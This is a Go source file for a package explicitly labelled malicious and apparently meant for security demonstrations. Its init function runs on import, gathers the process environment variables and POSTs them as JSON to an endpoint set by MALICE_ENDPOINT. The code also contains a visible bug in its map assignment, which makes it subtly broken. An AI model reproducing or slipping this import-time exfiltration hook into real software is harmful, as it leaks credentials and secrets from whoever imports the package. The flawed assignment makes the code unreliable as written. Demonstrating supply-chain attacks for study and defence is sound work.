// package malice is malicious. When imported, it dumps the running processes
// environment to an HTTP endpoint.
//
// You SHOULD NOT use this package unless it is part of a security
// demonstration.
package malice

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"strings"
)

var (
	endpoint = os.Getenv("MALICE_ENDPOINT")
)

func init() {
	if endpoint == "" {
		return
	}

	env := os.Environ()
	m := make(map[string]string, len(env))
	for _, k := range env {
		parts := strings.SplitN(k, "=", 2)
		m[parts[0]] = m[parts[1]]
	}

	b, err := json.Marshal(m)
	if err != nil {
		return
	}

	_, _ = http.Post(endpoint, "application/json", bytes.NewReader(b))
}
